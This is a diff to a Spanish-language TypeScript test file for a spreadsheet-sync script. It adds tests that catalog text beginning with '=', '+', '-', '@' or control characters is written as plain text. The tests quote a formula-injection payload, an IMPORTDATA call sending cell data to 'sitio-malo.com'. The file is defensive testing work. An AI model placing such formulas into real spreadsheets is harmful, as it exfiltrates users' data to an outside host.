@@ -36,7 +36,14 @@ function crearHoja(inicial: Record<string, unknown> = {}) {
   const rango = (f: number, c: number, nf = 1, nc = 1) => ({
     getValues: () => Array.from({ length: nf }, (_, i) => Array.from({ length: nc }, (_, j) => valores.get(clave(f + i, c + j)) ?? "")),
     getFormulas: () => Array.from({ length: nf }, (_, i) => Array.from({ length: nc }, (_, j) => formulas.get(clave(f + i, c + j)) ?? "")),
-    setValues: (m: unknown[][]) => m.forEach((fila, i) => fila.forEach((v, j) => { valores.set(clave(f + i, c + j), v); formulas.delete(clave(f + i, c + j)); })),
+    // Como Sheets: un texto con "=" adelante pasa a ser una FÓRMULA, salvo que lleve el apóstrofe de
+    // "forzar texto", que se guarda sin el apóstrofe.
+    setValues: (m: unknown[][]) => m.forEach((fila, i) => fila.forEach((v, j) => {
+      const k = clave(f + i, c + j);
+      if (typeof v === "string" && v.startsWith("'")) { valores.set(k, v.slice(1)); formulas.delete(k); }
+      else if (typeof v === "string" && v.startsWith("=")) { formulas.set(k, v); valores.delete(k); }
+      else { valores.set(k, v); formulas.delete(k); }
+    })),
     setValue: (v: unknown) => { valores.set(clave(f, c), v); formulas.delete(clave(f, c)); },
     setFormula: (fx: string) => { formulas.set(clave(f, c), fx); valores.delete(clave(f, c)); },
     clearContent: () => { for (let i = 0; i < nf; i++) for (let j = 0; j < nc; j++) { valores.delete(clave(f + i, c + j)); formulas.delete(clave(f + i, c + j)); } },
@@ -102,7 +109,7 @@ function cargarScript(opciones: { hojas: Record<string, Hoja>; respuesta: { codi
   };
   const fabrica = new Function(
     "module", "SpreadsheetApp", "PropertiesService", "LockService", "UrlFetchApp",
-    `${FUENTE}\nreturn { sincronizar_, etiquetaDePiscina, claveDePrecio, valorDePrecio, validarDatos, valorDeStock, buscarEncabezadoStock };`
+    `${FUENTE}\nreturn { sincronizar_, etiquetaDePiscina, claveDePrecio, valorDePrecio, validarDatos, valorDeStock, buscarEncabezadoStock, celdaParaEscribir_ };`
   );
   const api = fabrica({}, entorno.SpreadsheetApp, entorno.PropertiesService, entorno.LockService, entorno.UrlFetchApp);
   return { ...api, props, pedidos };
@@ -433,6 +440,49 @@ describe("proveedores nuevos o con datos nuevos llegan a la hoja Proveedores", (
     expect(hojas.Proveedores.v(6, 4)).toBe("+54 9 3534 111111");
     expect(hojas.Proveedores.v(7, 1)).toBe("Proveedor Nuevo");
     expect(hojas.Proveedores.v(7, 4)).toBe("+54 9 3534 222222");
+  });
+});
+
+describe("textos que parecen fórmulas (inyección de fórmulas desde el catálogo web)", () => {
+  const { celdaParaEscribir_ } = cargarScript({ hojas: {}, respuesta: { codigo: 200, cuerpo: {} } });
+
+  it.each([
+    ['=IMPORTDATA("https://sitio-malo.com/?d="&A1)', "igual"],
+    ["=1+1", "igual"],
+    ["+54 9 3534 111111", "más"],
+    ["-5 bolsas", "menos"],
+    ["@SUM(A1:A2)", "arroba"],
+    ["\t=1+1", "tabulador"],
+    ["\r=1+1", "retorno de carro"],
+  ])("le pone el apóstrofe a %s (%s)", (texto) => {
+    expect(celdaParaEscribir_(texto)).toBe(`'${texto}`);
+  });
+
+  it("no toca los números, los textos comunes, ni lo vacío", () => {
+    expect(celdaParaEscribir_(6461)).toBe(6461);
+    expect(celdaParaEscribir_(-5)).toBe(-5);
+    expect(celdaParaEscribir_(0)).toBe(0);
+    expect(celdaParaEscribir_("Cemento")).toBe("Cemento");
+    expect(celdaParaEscribir_("Cemento = 50 kg")).toBe("Cemento = 50 kg");
+    expect(celdaParaEscribir_(null)).toBe("");
+    expect(celdaParaEscribir_(undefined)).toBe("");
+  });
+
+  it("al sincronizar, un nombre de material con '=' queda como TEXTO y no como fórmula", () => {
+    const hojas = hojasBase() as Record<string, Hoja>;
+    const malo = '=IMPORTDATA("https://sitio-malo.com/?d="&B3)';
+    const cuerpo = {
+      ...DATOS,
+      proveedores: [[malo, "Corralón", "Juan", "+54 9 3534 111111", "", "", "nota"]],
+      articulos: [{ usd: false, fila: fila(malo, 6461) }],
+    };
+    cargarScript({ hojas, respuesta: { codigo: 200, cuerpo } }).sincronizar_(true);
+
+    expect(hojas.Proveedores.v(6, 1)).toBe(malo);
+    expect(hojas.Proveedores.formulas.get("6,1")).toBeUndefined();
+    expect(hojas.Proveedores.v(6, 4)).toBe("+54 9 3534 111111");
+    expect(hojas["Artículos"].v(6, 1)).toBe(malo);
+    expect(hojas["Artículos"].formulas.get("6,1")).toBeUndefined();
   });
 });
 
